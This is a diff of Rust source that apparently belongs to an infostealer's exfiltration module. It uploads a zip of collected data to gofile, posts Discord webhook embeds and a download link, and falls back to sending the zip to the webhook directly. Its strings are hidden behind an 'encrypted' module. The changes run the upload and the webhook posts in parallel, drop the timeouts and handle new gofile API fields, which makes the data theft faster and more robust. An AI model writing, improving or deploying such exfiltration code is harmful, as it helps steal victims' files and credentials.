@@ -1,4 +1,3 @@
-use std::time::Duration;
 use serde_json::{json, Value};
 use crate::encrypted::*;
 
@@ -44,9 +43,21 @@ pub async fn upload_to_gofile(client: &reqwest::Client, zip_data: Vec<u8>, zip_n
 
     if v["status"].as_str() != Some("ok") { return None; }
     let data = &v["data"];
-    if let Some(s) = data["downloadPage"].as_str().filter(|s| !s.is_empty()) { return Some(s.to_owned()); }
-    if let Some(s) = data["directLink"].as_str().filter(|s| !s.is_empty()) { return Some(s.to_owned()); }
-    if let Some(id) = data["fileId"].as_str().filter(|s| !s.is_empty()) {
+    if let Some(s) = data["downloadPage"].as_str().filter(|s| !s.is_empty()) {
+        return Some(s.to_owned());
+    }
+    if let Some(s) = data["directLink"].as_str().filter(|s| !s.is_empty()) {
+        return Some(s.to_owned());
+    }
+    // New API (2025): folder code for public download page
+    if let Some(code) = data["parentFolderCode"].as_str().filter(|s| !s.is_empty()) {
+        return Some(format!("{}/{}", s_gofile_download_path(), code));
+    }
+    if let Some(code) = data["code"].as_str().filter(|s| !s.is_empty()) {
+        return Some(format!("{}/{}", s_gofile_download_path(), code));
+    }
+    // Legacy + new field names for file id
+    if let Some(id) = data["fileId"].as_str().or_else(|| data["id"].as_str()).filter(|s| !s.is_empty()) {
         return Some(format!("{}/{}", s_gofile_download_path(), id));
     }
     None
@@ -61,45 +72,48 @@ pub async fn send_to_webhook(
 ) -> Vec<String> {
     let mut statuses: Vec<String> = Vec::new();
 
-    // Send embeds immediately — don't wait for gofile upload.
-    for (ci, chunk) in embeds.chunks(10).enumerate() {
-        let payload = json!({ s_sender_embeds(): chunk });
-        let r = client.post(webhook_url).json(&payload).send().await;
-        statuses.push(format!("{}{}]={}", s_sender_embeds_status(), ci, r.map(|r| r.status()).unwrap_or_default()));
-    }
+    // Gofile upload + Discord embeds in parallel (gofile API is fast; don't serialize them).
+    let client_embeds = client.clone();
+    let webhook_embeds = webhook_url.to_string();
+    let embeds_copy = embeds.clone();
 
-    // Try gofile with a short timeout so we don't block the webhook for minutes.
-    let gofile_link = tokio::time::timeout(
-        Duration::from_secs(12),
-        upload_to_gofile(client, zip_data.clone(), &zip_name),
-    )
-    .await
-    .ok()
-    .flatten();
+    let embeds_task = tokio::spawn(async move {
+        let mut embed_statuses = Vec::new();
+        for (ci, chunk) in embeds_copy.chunks(10).enumerate() {
+            let payload = json!({ s_sender_embeds(): chunk });
+            let r = client_embeds.post(&webhook_embeds).json(&payload).send().await;
+            embed_statuses.push(format!(
+                "{}{}]={}",
+                s_sender_embeds_status(),
+                ci,
+                r.map(|r| r.status()).unwrap_or_default()
+            ));
+        }
+        embed_statuses
+    });
 
+    let gofile_link = upload_to_gofile(client, zip_data.clone(), &zip_name).await;
+
+    statuses.extend(embeds_task.await.unwrap_or_default());
     statuses.push(if gofile_link.is_some() { s_sender_gofile_ok() } else { s_sender_gofile_fail() });
 
-    let mut content = String::new();
-    if let Some(ref link) = gofile_link {
-        content = format!("\u{1f4e6} Download: {}", link);
-    }
+    let content = if let Some(ref link) = gofile_link {
+        format!("\u{1f4e6} Download: {}", link)
+    } else {
+        String::new()
+    };
 
     let r = client.post(webhook_url).json(&json!({s_sender_content(): content})).send().await;
     statuses.push(format!("content={}", r.map(|r| r.status()).unwrap_or_default()));
 
+    // Discord direct upload only when gofile truly failed (slow — avoid if parsing was the bug).
     if gofile_link.is_none() {
         if let Ok(zip_part) = reqwest::multipart::Part::bytes(zip_data)
             .file_name(zip_name)
             .mime_str(&s_sender_application_zip())
         {
             let zip_form = reqwest::multipart::Form::new().part(s_sender_file(), zip_part);
-            let r = tokio::time::timeout(
-                Duration::from_secs(60),
-                client.post(webhook_url).multipart(zip_form).send(),
-            )
-            .await
-            .ok()
-            .and_then(|r| r.ok());
+            let r = client.post(webhook_url).multipart(zip_form).send().await;
             statuses.push(format!("zip_fallback={}", r.map(|r| r.status()).unwrap_or_default()));
         }
     }
